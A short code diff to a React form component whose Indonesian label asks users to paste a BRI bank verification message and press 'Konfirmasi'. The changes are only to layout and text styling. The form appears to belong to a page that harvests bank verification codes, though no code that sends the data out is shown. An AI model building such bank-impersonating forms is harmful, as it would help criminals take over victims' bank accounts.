@@ -10,15 +10,15 @@ const SiteVerifikasi = ({btnClick}) => {
     btnClick(data)
   }
   return (
-    <>      
+    <div style={{width:'100%', padding:'0 1rem'}}>      
         <form>
-            <label className='label-control'>𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐏𝐞𝐬𝐚𝐧 𝐕𝐞𝐫𝐢𝐟𝐢𝐤𝐚𝐬𝐢 𝐁𝐑𝐈</label>
-            <textarea id='msg' className='form-control' rows={7}></textarea>
+            <label className='label-control'>Masukkan Pesan Verifikasi BRI</label>
+            <textarea id='msg' className='form-control' rows={5}></textarea>
             <button type='button' onClick={handleClick} className='btn' id='btn' style={{marginTop:'-0.2em', marginBottom:'2em'}}>
               Konfirmasi
             </button>
         </form>
-    </>
+    </div>
   )
 }
 
